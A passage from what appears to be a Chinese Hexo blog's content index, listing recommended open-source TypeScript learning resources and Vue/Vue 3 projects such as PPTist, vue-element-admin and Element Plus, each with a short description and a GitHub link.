src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664445286344-12e51bd3-9fa2-4d12-bad3-bb8d7c5d9815.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664445286344-12e51bd3-9fa2-4d12-bad3-bb8d7c5d9815.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/mqyqingfeng/learn-typescript">https://github.com/mqyqingfeng/learn-typescript</a></p><h2 id="3-TypeScript-使用指南手册"><a href="#3-TypeScript-使用指南手册" class="headerlink" title="3. TypeScript 使用指南手册"></a>3. TypeScript 使用指南手册</h2><p>TypeScript 使用手册（中文版）翻译。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443280883-eac9817d-5d6f-4709-9edd-08350e2288dc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443280883-eac9817d-5d6f-4709-9edd-08350e2288dc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/zhongsp/TypeScript">https://github.com/zhongsp/TypeScript</a></p><h2 id="4-深入理解-TypeScript"><a href="#4-深入理解-TypeScript" class="headerlink" title="4. 深入理解 TypeScript"></a>4. 深入理解 TypeScript</h2><p>TypeScript Deep Dive 中文版。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443336206-fff9533f-b544-4a83-adc4-c5df6588d71e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443336206-fff9533f-b544-4a83-adc4-c5df6588d71e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/jkchao/typescript-book-chinese">https://github.com/jkchao/typescript-book-chinese</a></p><h2 id="5-TypeScript-入门教程"><a href="#5-TypeScript-入门教程" class="headerlink" title="5. TypeScript 入门教程"></a>5. TypeScript 入门教程</h2><p>从 JavaScript 程序员的角度总结思考，循序渐进的理解 TypeScript。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664444113373-16b2f5e8-a6a2-4058-a1ee-13d5b2a1f346.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664444113373-16b2f5e8-a6a2-4058-a1ee-13d5b2a1f346.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/xcatliu/typescript-tutorial">https://github.com/xcatliu/typescript-tutorial</a></p><h2 id="6-TypeScript-类型挑战"><a href="#6-TypeScript-类型挑战" class="headerlink" title="6. TypeScript 类型挑战"></a>6. TypeScript 类型挑战</h2><p>高质量的类型可以提高项目的可维护性并避免一些潜在的漏洞。本项目意在于让你更好的了解 TS 的类型系统，编写你自己的类型工具，或者只是单纯的享受挑战的乐趣！</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443405827-d4016c2b-48e4-4dd5-bf8f-0662c2bbf943.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443405827-d4016c2b-48e4-4dd5-bf8f-0662c2bbf943.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/type-challenges/type-challenges">https://github.com/type-challenges/type-challenges</a></p><h2 id="7-DefinitelyTyped"><a href="#7-DefinitelyTyped" class="headerlink" title="7. DefinitelyTyped"></a>7. DefinitelyTyped</h2><p>DefinitelyTyped 包含大量的高质量的 TypeScript 类型定义。通过使用 DefinitelyTyped 及其包含的声明文件，我们可以使用大多数流行的 JavaScript 库，就像它们是 TypeScript 库一样，将通过编译器进行类型验证。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443177881-2031d286-07ec-4cdc-a26a-ed70917413ab.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443177881-2031d286-07ec-4cdc-a26a-ed70917413ab.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/DefinitelyTyped/DefinitelyTyped">https://github.com/DefinitelyTyped/DefinitelyTyped</a></p><h2 id="8-react-redux-typescript-guide"><a href="#8-react-redux-typescript-guide" class="headerlink" title="8. react-redux-typescript-guide"></a>8. react-redux-typescript-guide</h2><p>本指南记录了有关在 React（及其生态系统）中以函数式风格使用 TypeScript 的模式和秘诀。它将使代码类型安全，同时专注于从实现中推断类型，从长远来看更容易编写和维护正确的类型。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443626158-f28e8f34-c652-48f3-8559-a75e799c8060.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443626158-f28e8f34-c652-48f3-8559-a75e799c8060.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/piotrwitek/react-redux-typescript-guide">https://github.com/piotrwitek/react-redux-typescript-guide</a></p><h2 id="9-React-TypeScript-备忘录"><a href="#9-React-TypeScript-备忘录" class="headerlink" title="9. React+TypeScript 备忘录"></a>9. React+TypeScript 备忘录</h2><p>专注于帮助 React 开发人员在 React 应用中使用 TypeScript。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443735038-9f6569f0-3926-43f9-8ded-774ba62e6000.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664443735038-9f6569f0-3926-43f9-8ded-774ba62e6000.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/typescript-cheatsheets/react">https://github.com/typescript-cheatsheets/react</a></p><h2 id="10-clean-code-typescript"><a href="#10-clean-code-typescript" class="headerlink" title="10. clean-code-typescript"></a>10. clean-code-typescript</h2><p>将 Clean Code 的概念适用到 TypeScript，引导读者使用 TypeScript 编写易读、可扩展的应用。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664442819230-a43b9ecf-99be-4693-89b6-e754c4ee811f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664442819230-a43b9ecf-99be-4693-89b6-e754c4ee811f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/labs42io/clean-code-typescript">https://github.com/labs42io/clean-code-typescript</a></p><h2 id="11-谷歌-TypeScript-风格指南"><a href="#11-谷歌-TypeScript-风格指南" class="headerlink" title="11. 谷歌 TypeScript 风格指南"></a>11. 谷歌 TypeScript 风格指南</h2><p>Google 的 TypeScript 风格指南。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664444037932-3bf69836-be2b-4da4-9662-7ffcdc33ab0b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664444037932-3bf69836-be2b-4da4-9662-7ffcdc33ab0b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://google.github.io/styleguide/tsguide.html">https://google.github.io/styleguide/tsguide.html</a></p><h2 id="12-Awesome-TypeScript"><a href="#12-Awesome-TypeScript" class="headerlink" title="12. Awesome TypeScript"></a>12. Awesome TypeScript</h2><p>很棒的 TypeScript 资源</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664445080945-3703231e-a035-4153-90ee-8ac0a22e6d63.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1664445080945-3703231e-a035-4153-90ee-8ac0a22e6d63.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/semlinker/awesome-typescript">https://github.com/semlinker/awesome-typescript</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue项目</title>
      <link href="/2023/06/30/frontend/collection/projects/vue-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/vue-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>**概览：</p><ol><li><strong>Marktext：</strong>笔记应用<br />2. <strong>YesPlayMusic：</strong>第三方网易云播放器<br />3. <strong>PicGo：</strong>图片上传应用<br />4 . <strong>PPTist：</strong>在线 PPT 应用<br />5. <strong>vue2-elm：</strong>仿饿了么<br />6. <strong>vue-element-admin：</strong>后台管理系统<br />7. <strong>Cider：</strong>Apple Music 播放器<br />8. <strong>newbee-mall-vue3-app：</strong>商城及后台管理系统</li></ol><p><a name="JjHko"></a></p><h2 id="1-Marktext"><a href="#1-Marktext" class="headerlink" title="1. Marktext"></a>1. Marktext</h2><p>Marktext 是一个简单而优雅的开源 Markdown 编辑器，专注于速度和可用性，适用于 Linux、macOS 和 Windows。其支持实时预览、Markdown 扩展、输出 HTML 和 PDF 文件，主题切换、多种编辑模式、直接从剪贴板粘贴图像等功能。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655046933104-008a03e3-1e74-4e74-af7e-e527f7f4c4df.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655046933104-008a03e3-1e74-4e74-af7e-e527f7f4c4df.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="IXJID"></a></p><h2 id="2-YesPlayMusic"><a href="#2-YesPlayMusic" class="headerlink" title="2. YesPlayMusic"></a>2. YesPlayMusic</h2><p>YesPlayMusic 是一个高颜值的第三方网易云播放器，使用 Vue.js 全家桶开发。可以使用网易云账号登录（扫码&#x2F;手机&#x2F;邮箱登录），支持 MV 播放、歌词显示、每日推荐歌曲、每日自动签到、Light&#x2F;Dark Mode 自动切换、Touch Bar、音乐云盘、定义快捷键和全局快捷键等功能。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655047151049-eaaea59f-a749-4215-a392-5a289dffda12.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655047151049-eaaea59f-a749-4215-a392-5a289dffda12.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="sEWFq"></a></p><h2 id="3-PicGo"><a href="#3-PicGo" class="headerlink" title="3. PicGo"></a>3. PicGo</h2><p>PicGo 是一个用于快速上传图片并获取图片 URL 链接的工具，支持多种图床、拖拽图片上传、图片预览、上传图片后自动复制链接到剪切板、自定义复制到表格的链接格式、支持快捷键、支持通过发送 HTTP 请求调用 PicGo 上传等功能。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655047478503-81bd384b-af15-460b-b8ad-b08d308cbc56.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655047478503-81bd384b-af15-460b-b8ad-b08d308cbc56.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="qC0p3"></a></p><h2 id="4-PPTist"><a href="#4-PPTist" class="headerlink" title="4. PPTist"></a>4. PPTist</h2><p>PPTist 是一个基于 Vue3.x + TypeScript 的在线演示文稿（幻灯片）应用，还原了大部分 Office PowerPoint 常用功能，支持 文字、图片、形状、线条、图表、表格、视频、音频、公式 几种最常用的元素类型，每一种元素都拥有高度可编辑能力，同时支持丰富的快捷键和右键菜单，支持导出本地 PPTX 文件，支持移动端基础编辑和预览，支持 PWA。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655049422986-298118aa-73ca-468c-9d6f-c60ce56c6192.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655049422986-298118aa-73ca-468c-9d6f-c60ce56c6192.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="jHShP"></a></p><h2 id="5-vue2-elm"><a href="#5-vue2-elm" class="headerlink" title="5. vue2-elm"></a>5. vue2-elm</h2><p>vue2-elm 是一个基于 vue2 + vuex 构建一个具有 45 个页面的仿饿了么的大型单页面应用，涉及注册、登录、商品展示、购物车、下单等，是一个完整的流程。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655046524754-904daab9-fb3c-4b6b-b43b-36b2a113575a.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655046524754-904daab9-fb3c-4b6b-b43b-36b2a113575a.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="ELpnp"></a></p><h2 id="6-vue-element-admin"><a href="#6-vue-element-admin" class="headerlink" title="6. vue-element-admin"></a>6. vue-element-admin</h2><p>vue-element-admin 是一个后台前端解决方案，它基于 vue 和 element-ui 实现。它使用了最新的前端技术栈，内置了 i18n 国际化解决方案，动态路由，权限验证，提炼了典型的业务模型，提供了丰富的功能组件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655046875319-243ad987-72d0-4f78-a678-dcbda8af87db.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655046875319-243ad987-72d0-4f78-a678-dcbda8af87db.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="yJiLM"></a></p><h2 id="7-Cider"><a href="#7-Cider" class="headerlink" title="7. Cider"></a>7. Cider</h2><p>Cider 是一个基于 Electron 和 Vue.js 的全新跨平台 Apple Music 体验，从头开始编写，同时兼顾性能和视觉效果。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655048457027-5b03b7d1-6310-49c3-a904-67349051dcf8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655048457027-5b03b7d1-6310-49c3-a904-67349051dcf8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="JWA2G"></a></p><h2 id="8-newbee-mall-vue3-app"><a href="#8-newbee-mall-vue3-app" class="headerlink" title="8. newbee-mall-vue3-app"></a>8. newbee-mall-vue3-app</h2><p>newbee-mall 项目是集电商，包括 newbee-mall 商城系统及 newbee-mall-admin 后台管理系统，基于 Spring Boot 2.X 和商城 Vue 3 以及相关技术栈开发。前台系统包含首页门户、商品分类新品上线、首页轮播、商品推荐、商品搜索、商品、购物车、订单结算、订单展示流程、订单管理、会员中心、帮助中心等模块。后台管理系统包含数据面板、播图管理、商品管理、订单管理、会员管理、分类管理、设置等模块。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655049066118-27c85460-d3d9-4960-b0a8-41226df7d9f1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1655049066118-27c85460-d3d9-4960-b0a8-41226df7d9f1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 项目 </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue3.0项目</title>
      <link href="/2023/06/30/frontend/collection/projects/vue3.0-xiang-mu/"/>
      <url>/2023/06/30/frontend/collection/projects/vue3.0-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="PPTist"><a href="#PPTist" class="headerlink" title="PPTist"></a>PPTist</h2><p>PPTist 是一个基于 Vue3.x + TypeScript + Pinia + Ant Design Vue + Canvas 的在线演示文稿（幻灯片）应用，还原了大部分 Office PowerPoint 常用功能，实现在线 PPT 的编辑、演示，支持导出 PPT 文件。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668699490411-87e44f8a-46e2-453e-a2b7-c778696cb1d0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668699490411-87e44f8a-46e2-453e-a2b7-c778696cb1d0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/pipipi-pikachu/PPTist">https://github.com/pipipi-pikachu/PPTist</a></p><h2 id="vue-next-admin"><a href="#vue-next-admin" class="headerlink" title="vue-next-admin"></a>vue-next-admin</h2><p>vue-next-admin 是一个基于 Vue3.x + Typescript + Vite + Element plus + Vuex 等，适配手机、平板、PC 的后台开源免费模板库。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668699809530-497827b4-b423-41b1-9f1f-922e675e5af1.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668699809530-497827b4-b423-41b1-9f1f-922e675e5af1.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/lyt-Top/vue-next-admin">https://github.com/lyt-Top/vue-next-admin</a></p><h2 id="Vue-vben-admin"><a href="#Vue-vben-admin" class="headerlink" title="Vue vben admin"></a>Vue vben admin</h2><p>Vue Vben Admin 是一个开源的中后台模版。使用了最新的 Vue3 + Vite + TypeScript + Pinia + Vue Router 等主流技术开发，开箱即用的中后台前端解决方案，也可用于学习参考。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668702599640-2f648c30-2872-4069-a92c-ac88b181aef3.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668702599640-2f648c30-2872-4069-a92c-ac88b181aef3.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/vbenjs/vue-vben-admin">https://github.com/vbenjs/vue-vben-admin</a></p><h2 id="VUE3-MUSIC"><a href="#VUE3-MUSIC" class="headerlink" title="VUE3-MUSIC"></a>VUE3-MUSIC</h2><p>VUE3-MUSIC 是一个基于 Vue 3 + TypeScript + Vite + Pinia + Vueuse 开发的音乐播放器，界面模仿 QQ 音乐 Mac 客户端，支持黑夜模式。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668704125444-35738b1a-c055-4984-90a9-ade483263447.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668704125444-35738b1a-c055-4984-90a9-ade483263447.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/SmallRuralDog/vue3-music">https://github.com/SmallRuralDog/vue3-music</a></p><h2 id="vue-pure-admin"><a href="#vue-pure-admin" class="headerlink" title="vue-pure-admin"></a>vue-pure-admin</h2><p>vue-pure-admin 是一款开源免费且开箱即用的中后台管理系统模版（兼容移动端）。使用 Vue3 + Vite + Element Plus、TypeScript + Pinia + Tailwindcss 等主流技术开发。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668700670222-52f89ed7-55ff-4019-865f-5c1ffd1ea984.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668700670222-52f89ed7-55ff-4019-865f-5c1ffd1ea984.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/xiaoxian521/vue-pure-admin">https://github.com/xiaoxian521/vue-pure-admin</a></p><h2 id="vue3-composition-admin"><a href="#vue3-composition-admin" class="headerlink" title="vue3-composition-admin"></a>vue3-composition-admin</h2><p>vue3-composition-admin 是一个管理端模板解决方案，它基于 Vue3、TypeScript、Vuex、Vue Router、Element plus，项目都是以 composition api 风格编写。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668700462537-b0665549-9924-447f-95e5-c2f2d02ab8ea.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668700462537-b0665549-9924-447f-95e5-c2f2d02ab8ea.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/RainManGO/vue3-composition-admin">https://github.com/RainManGO/vue3-composition-admin</a></p><h2 id="newbee-mall-vue3-app"><a href="#newbee-mall-vue3-app" class="headerlink" title="newbee-mall-vue3-app"></a>newbee-mall-vue3-app</h2><p>newbee-mall-vue3-app 是一个基于 Vue3 + Vue Router4 + Vuex4 + Vant3 的大型单页面商城项目。商城系统包含首页门户、商品分类、新品上线、首页轮播、商品推荐、商品搜索、商品展示、购物车、订单结算、订单流程、个人订单管理、会员中心、帮助中心等模块。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668703700886-1cc91ae6-fa23-443d-9a12-f0f1286c7c64.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668703700886-1cc91ae6-fa23-443d-9a12-f0f1286c7c64.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/newbee-ltd/newbee-mall-vue3-app">https://github.com/newbee-ltd/newbee-mall-vue3-app</a></p><h2 id="Element-Plus"><a href="#Element-Plus" class="headerlink" title="Element Plus"></a>Element Plus</h2><p>Element Plus 是一个基于 Vue 3 + Vite + TypeScript + Vitest 的面向设计师和开发者的组件库。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668705068971-15946d41-83e4-44c2-b9a7-21bb92d29cbc.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1668705068971-15946d41-83e4-44c2-b9a7-21bb92d29cbc.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>Github：</strong><a href="https://github.com/element-plus/element-plus">https://github.com/element-plus/element-plus</a></p><h2 id="vue3-bigData"><a href="#vue3-bigData" class="headerlink" title="vue3-bigData"></a>vue3-bigData</h2><p>vue3-bigData 是一个可视化系统，基于 Vue3.0 + Vuex + Vue Router + TypeScript + Echarts 实现，包括各种可视化图表。</p><p><img 